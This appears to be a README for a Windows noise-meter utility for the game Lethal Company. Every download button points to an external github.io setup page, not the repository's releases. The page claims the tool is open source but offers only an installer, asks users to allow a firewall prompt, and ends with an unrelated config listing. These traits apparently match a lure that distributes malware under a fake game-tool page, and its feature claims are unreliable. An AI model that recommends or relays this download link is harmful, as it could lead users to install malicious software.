# Lethal‑Company‑Noise‑Level‑Monitor

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-0369a1?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-workflows--usage"><img src="https://img.shields.io/badge/ARCHIVE-READY-0d9488?style=for-the-badge&logo=docker&logoColor=white&labelColor=161b22" alt="ARCHIVE"></a> <a href="#-overview"><img src="https://img.shields.io/badge/EDITION-STANDARD-65a30d?style=for-the-badge&logo=rocket&logoColor=white&labelColor=161b22" alt="EDITION"></a>
  <br>
  <a href="#-frequently-asked-questions"><img src="https://img.shields.io/badge/FAQ-ANSWERS-0f766e?style=for-the-badge&logo=book&logoColor=white&labelColor=161b22" alt="FAQ"></a> <a href="#-workflows--usage"><img src="https://img.shields.io/badge/WORKFLOW-GUIDE-9333ea?style=for-the-badge&logo=terminal&logoColor=white&labelColor=161b22" alt="WORKFLOW"></a>
</div>

**Author:** MidnightPilotPonder
**Platform:** Windows 10 / Windows 11 (desktop only)
**Category:** Game utilities – real‑time audio monitoring for *Lethal Company*

---

## 🎮 What is this?

A lightweight Windows‑only desktop helper that watches the in‑game sound output of **Lethal Company** and displays the current noise level in decibels (dB). Keep an eye on how loud your crew gets while exploring the abandoned facilities – perfect for streamers, speed‑runners, and anyone who loves a little auditory feedback.

---

## ✨ Features

| ✅ | Feature |
|---|---|
| **Real‑time dB meter** | Updates dozens of times per second, showing exact decibel values. |
| **Minimal footprint** | < 5 MB download, runs silently in the background. |
| **Customizable thresholds** | Set warning levels that flash the UI when the noise spikes. |
| **Overlay support** | Optional always‑on‑top window that can be positioned over the game. |
| **Zero‑configuration** | Detects the default audio device automatically. |
| **Open source** | Fully transparent code, contributions welcome. |

---

## 📥 Get Started

<div style="text-align:center; margin: 1rem 0;">
  <a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="display:inline-block; background:#4CAF50; color:white; padding:12px 24px; border-radius:6px; text-decoration:none; font-weight:bold;">Download / Install</a>
</div>

1. Click the button above to open the Release page.
2. Follow the on‑screen instructions to place the utility wherever you like.
3. Launch **Lethal Company**, then start the Noise‑Level‑Monitor from the start‑menu shortcut.
4. Adjust the overlay and threshold settings via the tray icon.

---

## 🛠️ Installation Walk‑through

1. **Download** the installer from the link above.
2. **Run** the installer – it will ask for a destination folder (default is `C:\Program Files\LethalCompanyNoiseMonitor`).
3. **Allow** the firewall prompt if you want the optional remote‑log feature (off by default).
4. **Finish** the wizard; a shortcut will appear on your desktop and in the start menu.

*No additional runtimes or drivers are required.*

---

## 📊 How It Works

The monitor hooks into the default playback device using the Windows Core Audio APIs, samples the audio stream, and converts the RMS value to a decibel reading. The calculation is performed in a background thread, ensuring zero impact on game performance.

```
dB = 20 * log10(RMS / ReferenceLevel)
```

The UI refreshes at 30 Hz, providing smooth visual feedback without flicker.

---

## 🤝 Contributing

1. Fork the repository.
2. Create a feature branch (`git checkout -b feature/your‑idea`).
3. Submit a pull request with a clear description of your changes.

Please keep contributions Windows‑focused and respect the existing code style.

---

## 📜 License

This project is licensed under the **MIT License** – see the `LICENSE` file for details.

---

## 📣 Support & Feedback

- **Issues:** Open a GitHub issue for bugs or feature requests.
- **Discussions:** Join the repository’s Discussions tab to share tips, custom thresholds, or streaming setups.

Stay quiet, stay alive – let the meter do the talking!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```